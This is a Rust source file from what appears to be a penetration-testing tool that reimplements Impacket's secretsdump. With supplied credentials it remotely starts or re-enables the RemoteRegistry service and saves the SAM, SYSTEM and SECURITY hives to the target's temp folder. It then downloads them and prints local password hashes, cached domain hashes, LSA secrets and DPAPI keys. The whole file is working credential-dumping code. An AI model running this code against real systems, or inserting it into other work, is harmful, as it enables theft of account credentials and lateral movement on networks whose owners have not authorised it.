//! Pure-Rust SAM / LSA dump via MS-RRP `BaseRegSaveKey` over SMB2 named pipes.
//!
//! Phase C of the cross-platform portage. Replaces the Windows-only
//! `RegConnectRegistry` + `RegSaveKey` path.
//!
//! Workflow:
//! 1. Bind WINREG pipe (`\PIPE\winreg`) with NTLMSSP PKT_PRIVACY.
//! 2. `OpenLocalMachine(KEY_ALL_ACCESS)` → hklm handle.
//! 3. `BaseRegSaveKey(hklm, "SAM", remote_path)`.
//! 4. `BaseRegSaveKey(hklm, "SYSTEM", remote_path)` (needed for bootkey).
//! 5. Download both files via SMB2 `read_full_file` on `C$`.
//! 6. Parse with existing `Hive::from_bytes` + `sam::extract_bootkey` /
//!    `sam::dump_sam_hashes`.
//! 7. Cleanup — v1 leaves temp files with a warning (DELETE arrives Phase D).
//!
//! **Prerequisite:** the target must have the `RemoteRegistry` service
//! running. If it is stopped, the first `OpenLocalMachine` will fail with
//! `ERROR_BAD_PIPE` / `STATUS_OBJECT_NAME_NOT_FOUND`.

use std::sync::{Arc, Mutex};

use netraze_dcerpc::channel::RpcChannel;
use netraze_dcerpc::interfaces::{scmr, winreg};

use super::connection::SmbCredential;
use super::hive::Hive;
use super::lsa::{self, LsaDumpResult};
use super::rpc::{SmbPipeTransport, build_binder, connect_session};
use super::sam::{self, SamHash};
use super::smb2::Smb2Session;

/// Result of a SAM dump operation.
pub struct SamDumpResult {
    pub hashes: Vec<SamHash>,
    pub bootkey: [u8; 16],
    pub errors: Vec<String>,
}

// LsaDumpResult is defined in lsa.rs

/// Ensure the `RemoteRegistry` service is running, starting it via SCMR
/// if necessary.
///
/// Returns `(was_stopped, was_disabled)` so the caller can restore the
/// original state after the operation.
async fn start_remote_registry(
    session: &Arc<Mutex<Smb2Session>>,
    ipc: u32,
    cred: &SmbCredential,
) -> Result<(bool, bool), String> {
    let pipe = Arc::new(
        SmbPipeTransport::open(session.clone(), ipc, "svcctl")
            .map_err(|e| format!("open svcctl pipe: {e}"))?,
    );

    let binder = build_binder(cred, 0);
    let mut ch = RpcChannel::bind_authenticated(pipe, scmr::uuid(), (2, 0), binder)
        .await
        .map_err(|e| format!("SCMR bind_authenticated: {e}"))?;

    // 1. Open SCManager
    // Windows SCMR rejects a NULL machine name; Impacket defaults to
    // 'DUMMY\x00' and NetExec passes the target hostname. We use the
    // hostname when available, otherwise the Impacket fallback.
    // lpMachineName: Impacket defaults to 'DUMMY\x00'.  Windows SCMR
    // is notoriously picky about this field — an IP literal or an
    // unresolvable name often causes RPC_S_CANNOT_SUPPORT (0x6e4) on
    // hardened targets.  Stick to the Impacket default.
    let machine_name = "DUMMY\0";
    let stub = scmr::encode_ropen_sc_manager_w_request(
        Some(machine_name),
        Some("ServicesActive\0"),
        scmr::SC_MANAGER_ACCESS,
    );
    let resp = ch
        .call(scmr::Opnum::ROpenSCManagerW as u16, &stub)
        .await
        .map_err(|e| format!("ROpenSCManagerW: {e}"))?;
    let (scm_handle, status) = scmr::decode_ropen_sc_manager_w_response(&resp)
        .map_err(|e| format!("decode ROpenSCManagerW: {e}"))?;
    if status != 0 {
        return Err(format!("ROpenSCManagerW failed with status 0x{status:08x}"));
    }

    // 2. Open RemoteRegistry service
    let stub = scmr::encode_ropen_service_w_request(
        &scm_handle,
        "RemoteRegistry\0",
        scmr::SERVICE_ACCESS_START,
    );
    let resp = ch
        .call(scmr::Opnum::ROpenServiceW as u16, &stub)
        .await
        .map_err(|e| format!("ROpenServiceW: {e}"))?;
    let (svc_handle, status) = scmr::decode_ropen_service_w_response(&resp)
        .map_err(|e| format!("decode ROpenServiceW: {e}"))?;
    if status != 0 {
        let _ = close_scm(&mut ch, &scm_handle).await;
        return Err(format!("ROpenServiceW failed with status 0x{status:08x}"));
    }

    // 3. Query status
    let mut running = false;
    let mut was_stopped = false;
    let mut was_disabled = false;
    let stub = scmr::encode_rquery_service_status_request(&svc_handle);
    let resp = ch
        .call(scmr::Opnum::RQueryServiceStatus as u16, &stub)
        .await
        .map_err(|e| format!("RQueryServiceStatus: {e}"))?;
    let (status_info, status) = scmr::decode_rquery_service_status_response(&resp)
        .map_err(|e| format!("decode RQueryServiceStatus: {e}"))?;
    if status != 0 {
        let _ = close_scm(&mut ch, &svc_handle).await;
        let _ = close_scm(&mut ch, &scm_handle).await;
        return Err(format!(
            "RQueryServiceStatus failed with status 0x{status:08x}"
        ));
    }
    if status_info.current_state == scmr::SERVICE_RUNNING {
        running = true;
    } else {
        was_stopped = true;
    }

    // 4. Start if not running
    if !running {
        let stub = scmr::encode_rstart_service_w_request(&svc_handle, 0);
        let resp = ch
            .call(scmr::Opnum::RStartServiceW as u16, &stub)
            .await
            .map_err(|e| format!("RStartServiceW: {e}"))?;
        let start_status = scmr::decode_rstart_service_w_response(&resp)
            .map_err(|e| format!("decode RStartServiceW: {e}"))?;

        if start_status == scmr::ERROR_SERVICE_DISABLED {
            was_disabled = true;
            // Enable the service first, then try again.
            let stub = scmr::encode_rchange_service_config_w_request(
                &svc_handle,
                scmr::SERVICE_NO_CHANGE,
                scmr::SERVICE_DEMAND_START,
                scmr::SERVICE_NO_CHANGE,
            );
            let resp = ch
                .call(scmr::Opnum::RChangeServiceConfigW as u16, &stub)
                .await
                .map_err(|e| format!("RChangeServiceConfigW: {e}"))?;
            let (_, cfg_status) = scmr::decode_rchange_service_config_w_response(&resp)
                .map_err(|e| format!("decode RChangeServiceConfigW: {e}"))?;
            if cfg_status != 0 {
                let _ = close_scm(&mut ch, &svc_handle).await;
                let _ = close_scm(&mut ch, &scm_handle).await;
                return Err(format!(
                    "RChangeServiceConfigW failed with status 0x{cfg_status:08x}"
                ));
            }

            // Retry start
            let stub = scmr::encode_rstart_service_w_request(&svc_handle, 0);
            let resp = ch
                .call(scmr::Opnum::RStartServiceW as u16, &stub)
                .await
                .map_err(|e| format!("RStartServiceW (retry): {e}"))?;
            let start_status2 = scmr::decode_rstart_service_w_response(&resp)
                .map_err(|e| format!("decode RStartServiceW (retry): {e}"))?;
            if start_status2 != 0 && start_status2 != scmr::ERROR_SERVICE_ALREADY_RUNNING {
                let _ = close_scm(&mut ch, &svc_handle).await;
                let _ = close_scm(&mut ch, &scm_handle).await;
                return Err(format!(
                    "RStartServiceW (retry) failed with status 0x{start_status2:08x}"
                ));
            }
        } else if start_status != 0 && start_status != scmr::ERROR_SERVICE_ALREADY_RUNNING {
            let _ = close_scm(&mut ch, &svc_handle).await;
            let _ = close_scm(&mut ch, &scm_handle).await;
            return Err(format!(
                "RStartServiceW failed with status 0x{start_status:08x}"
            ));
        }

        // Poll until running (max ~10s)
        for _ in 0..20 {
            tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
            let stub = scmr::encode_rquery_service_status_request(&svc_handle);
            let resp = ch
                .call(scmr::Opnum::RQueryServiceStatus as u16, &stub)
                .await
                .map_err(|e| format!("RQueryServiceStatus (poll): {e}"))?;
            let (status_info, status) = scmr::decode_rquery_service_status_response(&resp)
                .map_err(|e| format!("decode RQueryServiceStatus (poll): {e}"))?;
            if status != 0 {
                break;
            }
            if status_info.current_state == scmr::SERVICE_RUNNING {
                running = true;
                break;
            }
        }
    }

    // 5. Cleanup
    let _ = close_scm(&mut ch, &svc_handle).await;
    let _ = close_scm(&mut ch, &scm_handle).await;

    if !running {
        return Err("RemoteRegistry service did not start within timeout".into());
    }
    Ok((was_stopped, was_disabled))
}

/// Dump local SAM hashes via WINREG + hive parsing.
///
/// Convenience wrapper that creates its own SMB2 session.
pub async fn remote_dump_sam(target: &str, cred: &SmbCredential) -> Result<SamDumpResult, String> {
    let session = Arc::new(Mutex::new(
        connect_session(target, cred).map_err(|e| format!("connect_session: {e}"))?,
    ));
    let ipc = session
        .lock()
        .map_err(|e| format!("session mutex poisoned: {e}"))?
        .tree_connect(target, "IPC$")
        .map_err(|e| format!("tree_connect IPC$: {e}"))?;
    dump_sam(&session, ipc, target, cred).await
}

/// Dump LSA secrets via WINREG `BaseRegSaveKey` + offline hive decryption.
///
/// Convenience wrapper that creates its own SMB2 session.
pub async fn remote_dump_lsa(target: &str, cred: &SmbCredential) -> Result<LsaDumpResult, String> {
    let session = Arc::new(Mutex::new(
        connect_session(target, cred).map_err(|e| format!("connect_session: {e}"))?,
    ));
    let ipc = session
        .lock()
        .map_err(|e| format!("session mutex poisoned: {e}"))?
        .tree_connect(target, "IPC$")
        .map_err(|e| format!("tree_connect IPC$: {e}"))?;
    dump_lsa(&session, ipc, target, cred).await
}

/// Dump SAM hashes using an existing SMB2 session.
///
/// If the `winreg` pipe is not available, this falls back to starting the
/// `RemoteRegistry` service via SCMR (same behaviour as `remote_dump_sam`).
pub async fn dump_sam(
    session: &Arc<Mutex<Smb2Session>>,
    ipc: u32,
    target: &str,
    cred: &SmbCredential,
) -> Result<SamDumpResult, String> {
    let pipe = match SmbPipeTransport::open(session.clone(), ipc, "winreg") {
        Ok(p) => Arc::new(p),
        Err(_e) => {
            start_remote_registry(session, ipc, cred).await?;
            Arc::new(
                SmbPipeTransport::open(session.clone(), ipc, "winreg")
                    .map_err(|e2| format!("open winreg pipe (after SCMR start): {e2}"))?,
            )
        }
    };

    let binder = build_binder(cred, 0);
    let mut ch = RpcChannel::bind_authenticated(pipe, winreg::uuid(), (1, 0), binder)
        .await
        .map_err(|e| format!("WINREG bind_authenticated: {e}"))?;

    // 1. OpenLocalMachine
    let stub = winreg::encode_open_local_machine_request(winreg::KEY_ALL_ACCESS);
    let resp = ch
        .call(winreg::Opnum::OpenLocalMachine as u16, &stub)
        .await
        .map_err(|e| format!("OpenLocalMachine: {e}"))?;
    let (hklm, status) = winreg::decode_open_local_machine_response(&resp)
        .map_err(|e| format!("decode OpenLocalMachine: {e}"))?;
    if status != 0 {
        return Err(format!(
            "OpenLocalMachine failed with status 0x{status:08x}. \
             Is the RemoteRegistry service running?"
        ));
    }

    // 2. Save SAM + SYSTEM hives to temp files on the target.
    let nonce = format!("{:08x}", rand::random::<u32>());
    let sam_remote = format!("Windows\\Temp\\sam_{nonce}.save");
    let system_remote = format!("Windows\\Temp\\sys_{nonce}.save");

    let stub_sam = winreg::encode_base_reg_save_key_request(&hklm, &sam_remote);
    let resp_sam = ch
        .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sam)
        .await
        .map_err(|e| format!("BaseRegSaveKey SAM: {e}"))?;
    let status_sam = winreg::decode_base_reg_save_key_response(&resp_sam)
        .map_err(|e| format!("decode BaseRegSaveKey SAM: {e}"))?;
    if status_sam != 0 {
        let _ = close_reg(&mut ch, &hklm).await;
        return Err(format!(
            "BaseRegSaveKey(SAM) failed with status 0x{status_sam:08x}"
        ));
    }

    let stub_sys = winreg::encode_base_reg_save_key_request(&hklm, &system_remote);
    let resp_sys = ch
        .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sys)
        .await
        .map_err(|e| format!("BaseRegSaveKey SYSTEM: {e}"))?;
    let status_sys = winreg::decode_base_reg_save_key_response(&resp_sys)
        .map_err(|e| format!("decode BaseRegSaveKey SYSTEM: {e}"))?;
    if status_sys != 0 {
        let _ = close_reg(&mut ch, &hklm).await;
        return Err(format!(
            "BaseRegSaveKey(SYSTEM) failed with status 0x{status_sys:08x}"
        ));
    }

    // 3. Close hklm
    let _ = close_reg(&mut ch, &hklm).await;

    // 4. Download hives via SMB2 on C$
    let sam_bytes = {
        let mut s = session
            .lock()
            .map_err(|e| format!("session mutex poisoned: {e}"))?;
        s.read_full_file(target, "C$", &sam_remote)
            .map_err(|e| format!("read SAM hive: {}", e.as_str()))?
    };

    let system_bytes = {
        let mut s = session
            .lock()
            .map_err(|e| format!("session mutex poisoned: {e}"))?;
        s.read_full_file(target, "C$", &system_remote)
            .map_err(|e| format!("read SYSTEM hive: {}", e.as_str()))?
    };

    // 5. Parse hives
    let system_hive = Hive::from_bytes(system_bytes).map_err(|e| format!("parse SYSTEM: {e}"))?;
    let bootkey =
        sam::extract_bootkey(&system_hive).map_err(|e| format!("extract bootkey: {e}"))?;

    let sam_hive = Hive::from_bytes(sam_bytes).map_err(|e| format!("parse SAM: {e}"))?;
    let hashes = sam::dump_sam_hashes(&sam_hive, &bootkey).map_err(|e| format!("dump SAM: {e}"))?;

    Ok(SamDumpResult {
        hashes,
        bootkey,
        errors: Vec::new(),
    })
}

/// Dump LSA secrets using an existing SMB2 session.
///
/// If the `winreg` pipe is not available, this falls back to starting the
/// `RemoteRegistry` service via SCMR (same behaviour as `remote_dump_lsa`).
pub async fn dump_lsa(
    session: &Arc<Mutex<Smb2Session>>,
    ipc: u32,
    target: &str,
    cred: &SmbCredential,
) -> Result<LsaDumpResult, String> {
    let pipe = match SmbPipeTransport::open(session.clone(), ipc, "winreg") {
        Ok(p) => Arc::new(p),
        Err(_e) => {
            start_remote_registry(session, ipc, cred).await?;
            Arc::new(
                SmbPipeTransport::open(session.clone(), ipc, "winreg")
                    .map_err(|e2| format!("open winreg pipe (after SCMR start): {e2}"))?,
            )
        }
    };

    let binder = build_binder(cred, 0);
    let mut ch = RpcChannel::bind_authenticated(pipe, winreg::uuid(), (1, 0), binder)
        .await
        .map_err(|e| format!("WINREG bind_authenticated: {e}"))?;

    // 1. OpenLocalMachine
    let stub = winreg::encode_open_local_machine_request(winreg::KEY_ALL_ACCESS);
    let resp = ch
        .call(winreg::Opnum::OpenLocalMachine as u16, &stub)
        .await
        .map_err(|e| format!("OpenLocalMachine: {e}"))?;
    let (hklm, status) = winreg::decode_open_local_machine_response(&resp)
        .map_err(|e| format!("decode OpenLocalMachine: {e}"))?;
    if status != 0 {
        return Err(format!(
            "OpenLocalMachine failed with status 0x{status:08x}. \
             Is the RemoteRegistry service running?"
        ));
    }

    // 2. Save SYSTEM + SECURITY hives to temp files on the target.
    let nonce = format!("{:08x}", rand::random::<u32>());
    let system_remote = format!("Windows\\Temp\\sys_{nonce}.save");
    let security_remote = format!("Windows\\Temp\\sec_{nonce}.save");

    let stub_sys = winreg::encode_base_reg_save_key_request(&hklm, &system_remote);
    let resp_sys = ch
        .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sys)
        .await
        .map_err(|e| format!("BaseRegSaveKey SYSTEM: {e}"))?;
    let status_sys = winreg::decode_base_reg_save_key_response(&resp_sys)
        .map_err(|e| format!("decode BaseRegSaveKey SYSTEM: {e}"))?;
    if status_sys != 0 {
        let _ = close_reg(&mut ch, &hklm).await;
        return Err(format!(
            "BaseRegSaveKey(SYSTEM) failed with status 0x{status_sys:08x}"
        ));
    }

    let stub_sec = winreg::encode_base_reg_save_key_request(&hklm, &security_remote);
    let resp_sec = ch
        .call(winreg::Opnum::BaseRegSaveKey as u16, &stub_sec)
        .await
        .map_err(|e| format!("BaseRegSaveKey SECURITY: {e}"))?;
    let status_sec = winreg::decode_base_reg_save_key_response(&resp_sec)
        .map_err(|e| format!("decode BaseRegSaveKey SECURITY: {e}"))?;
    if status_sec != 0 {
        let _ = close_reg(&mut ch, &hklm).await;
        return Err(format!(
            "BaseRegSaveKey(SECURITY) failed with status 0x{status_sec:08x}"
        ));
    }

    // 3. Close hklm
    let _ = close_reg(&mut ch, &hklm).await;

    // 4. Download hives via SMB2 on C$
    let system_bytes = {
        let mut s = session
            .lock()
            .map_err(|e| format!("session mutex poisoned: {e}"))?;
        s.read_full_file(target, "C$", &system_remote)
            .map_err(|e| format!("read SYSTEM hive: {}", e.as_str()))?
    };

    let security_bytes = {
        let mut s = session
            .lock()
            .map_err(|e| format!("session mutex poisoned: {e}"))?;
        s.read_full_file(target, "C$", &security_remote)
            .map_err(|e| format!("read SECURITY hive: {}", e.as_str()))?
    };

    // 5. Parse hives
    let system_hive = Hive::from_bytes(system_bytes).map_err(|e| format!("parse SYSTEM: {e}"))?;
    let bootkey =
        sam::extract_bootkey(&system_hive).map_err(|e| format!("extract bootkey: {e}"))?;

    let security_hive =
        Hive::from_bytes(security_bytes).map_err(|e| format!("parse SECURITY: {e}"))?;
    let result = lsa::dump_lsa(&bootkey, &security_hive).map_err(|e| format!("dump LSA: {e}"))?;

    Ok(result)
}

/// Helper: close a WINREG handle, ignoring errors (best-effort cleanup).
async fn close_reg(ch: &mut RpcChannel, handle: &winreg::RegHandle) {
    let stub = winreg::encode_base_reg_close_key_request(handle);
    let _ = ch.call(winreg::Opnum::BaseRegCloseKey as u16, &stub).await;
}

/// Helper: close an SCMR handle, ignoring errors (best-effort cleanup).
async fn close_scm(ch: &mut RpcChannel, handle: &scmr::ScmHandle) {
    let stub = scmr::encode_rclose_service_handle_request(handle);
    let _ = ch
        .call(scmr::Opnum::RCloseServiceHandle as u16, &stub)
        .await;
}

// ---------------------------------------------------------------------------
// RemoteRegistry lifecycle handle (start / stop / restore)
// ---------------------------------------------------------------------------

/// Tracks the original state of the `RemoteRegistry` service so it can be
/// restored after the dump operation.
pub struct RemoteRegistryHandle {
    was_stopped: bool,
    was_disabled: bool,
}

impl RemoteRegistryHandle {
    /// Ensure the `RemoteRegistry` service is running, printing status
    /// messages that match secretsdump.py output.
    pub async fn start(
        session: &Arc<Mutex<Smb2Session>>,
        ipc: u32,
        cred: &SmbCredential,
    ) -> Result<Self, String> {
        let (was_stopped, was_disabled) = start_remote_registry(session, ipc, cred).await?;

        if was_disabled {
            println!("[*] Service RemoteRegistry is disabled, enabling it");
        } else if was_stopped {
            println!("[*] Service RemoteRegistry is in stopped state");
        }
        if was_stopped {
            println!("[*] Starting service RemoteRegistry");
        }
        Ok(Self {
            was_stopped,
            was_disabled,
        })
    }

    /// Stop the service if we started it, and restore the disabled state
    /// if we enabled it.  Prints secretsdump.py-style messages.
    pub async fn finish(
        self,
        session: &Arc<Mutex<Smb2Session>>,
        ipc: u32,
        cred: &SmbCredential,
    ) {
        println!("[*] Cleaning up...");

        if !self.was_stopped {
            return;
        }

        let pipe = match SmbPipeTransport::open(session.clone(), ipc, "svcctl") {
            Ok(p) => Arc::new(p),
            Err(e) => {
                eprintln!("WARN: could not open svcctl pipe for cleanup: {e}");
                return;
            }
        };

        let binder = build_binder(cred, 0);
        let mut ch = match RpcChannel::bind_authenticated(pipe, scmr::uuid(), (2, 0), binder).await
        {
            Ok(c) => c,
            Err(e) => {
                eprintln!("WARN: SCMR bind for cleanup failed: {e}");
                return;
            }
        };

        let machine_name = "DUMMY\0";
        let stub = scmr::encode_ropen_sc_manager_w_request(
            Some(machine_name),
            Some("ServicesActive\0"),
            scmr::SC_MANAGER_ACCESS,
        );
        let resp = match ch.call(scmr::Opnum::ROpenSCManagerW as u16, &stub).await {
            Ok(r) => r,
            Err(e) => {
                eprintln!("WARN: ROpenSCManagerW for cleanup failed: {e}");
                return;
            }
        };
        let (scm_handle, status) = match scmr::decode_ropen_sc_manager_w_response(&resp) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("WARN: decode ROpenSCManagerW for cleanup failed: {e}");
                return;
            }
        };
        if status != 0 {
            eprintln!("WARN: ROpenSCManagerW for cleanup returned 0x{status:08x}");
            return;
        }

        let stub = scmr::encode_ropen_service_w_request(
            &scm_handle,
            "RemoteRegistry\0",
            scmr::SERVICE_ACCESS_START,
        );
        let resp = match ch.call(scmr::Opnum::ROpenServiceW as u16, &stub).await {
            Ok(r) => r,
            Err(e) => {
                eprintln!("WARN: ROpenServiceW for cleanup failed: {e}");
                let _ = close_scm(&mut ch, &scm_handle).await;
                return;
            }
        };
        let (svc_handle, status) = match scmr::decode_ropen_service_w_response(&resp) {
            Ok(v) => v,
            Err(e) => {
                eprintln!("WARN: decode ROpenServiceW for cleanup failed: {e}");
                let _ = close_scm(&mut ch, &scm_handle).await;
                return;
            }
        };
        if status != 0 {
            eprintln!("WARN: ROpenServiceW for cleanup returned 0x{status:08x}");
            let _ = close_scm(&mut ch, &scm_handle).await;
            return;
        }

        println!("[*] Stopping service RemoteRegistry");
        let stub = scmr::encode_rcontrol_service_request(&svc_handle, scmr::SERVICE_CONTROL_STOP);
        let _ = ch.call(scmr::Opnum::RControlService as u16, &stub).await;

        if self.was_disabled {
            println!("[*] Restoring the disabled state for service RemoteRegistry");
            let stub = scmr::encode_rchange_service_config_w_request(
                &svc_handle,
                scmr::SERVICE_NO_CHANGE,
                scmr::SERVICE_DISABLED,
                scmr::SERVICE_NO_CHANGE,
            );
            let _ = ch.call(scmr::Opnum::RChangeServiceConfigW as u16, &stub).await;
        }

        let _ = close_scm(&mut ch, &svc_handle).await;
        let _ = close_scm(&mut ch, &scm_handle).await;
    }
}

// ---------------------------------------------------------------------------
// secrets_dump — full orchestration with exact secretsdump.py formatting
// ---------------------------------------------------------------------------

/// Run a full secrets dump (SAM + LSA) against a remote target, printing
/// output in the same format as Impacket `secretsdump.py`.
///
/// `domain` may be `None` (local account) or an explicit domain name.
pub async fn secrets_dump(
    target: &str,
    username: &str,
    password: &str,
    domain: Option<&str>,
) -> Result<(), String> {
    let cred = SmbCredential::new(username, domain.unwrap_or(""), password);

    let session = Arc::new(Mutex::new(
        connect_session(target, &cred).map_err(|e| format!("connect_session: {e}"))?,
    ));
    let ipc = session
        .lock()
        .map_err(|e| format!("session mutex poisoned: {e}"))?
        .tree_connect(target, "IPC$")
        .map_err(|e| format!("tree_connect IPC$: {e}"))?;

    let handle = RemoteRegistryHandle::start(&session, ipc, &cred).await?;

    let sam_result = dump_sam(&session, ipc, target, &cred)
        .await
        .map_err(|e| format!("SAM dump failed: {e}"))?;

    let lsa_result = dump_lsa(&session, ipc, target, &cred)
        .await
        .map_err(|e| format!("LSA dump failed: {e}"))?;

    // Print bootkey
    println!(
        "[*] Target system bootKey: 0x{}",
        sam_result.bootkey.iter().map(|b| format!("{b:02x}")).collect::<String>()
    );

    // Print SAM hashes
    println!("[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)");
    for h in &sam_result.hashes {
        println!("{h}");
    }

    // Print cached hashes
    if !lsa_result.cached_hashes.is_empty() {
        println!("[*] Dumping cached domain logon information (domain/username:hash)");
        for h in &lsa_result.cached_hashes {
            println!("{h}");
        }
    }

    // Print LSA secrets
    println!("[*] Dumping LSA Secrets");
    for secret in &lsa_result.secrets {
        // secretsdump.py prints the secret name as [*] name on its own line,
        // then the value on the next line(s).
        if secret.starts_with("dpapi_machinekey:") || secret.starts_with("dpapi_userkey:") {
            // DPAPI keys are already formatted as "dpapi_machinekey:0x..."
            println!("{secret}");
        } else if secret.starts_with("NL$") && secret.contains(':') {
            // NL$KM:hexstring  (no 0x prefix)
            let parts: Vec<&str> = secret.splitn(2, ':').collect();
            println!("[*] {}", parts[0]);
            // Optional hex dump line for NL$KM
            if parts[1].len() >= 32 {
                println!("{}   {}", &parts[1][..16], &parts[1][16..32]);
            }
            println!("{secret}");
        } else if secret.starts_with('$') || secret.starts_with('_') {
            let parts: Vec<&str> = secret.splitn(2, ':').collect();
            if parts.len() == 2 {
                println!("[*] {}", parts[0]);
                println!("{}", parts[1]);
            } else {
                println!("{secret}");
            }
        } else {
            println!("{secret}");
        }
    }

    // Cleanup
    handle.finish(&session, ipc, &cred).await;

    Ok(())
}
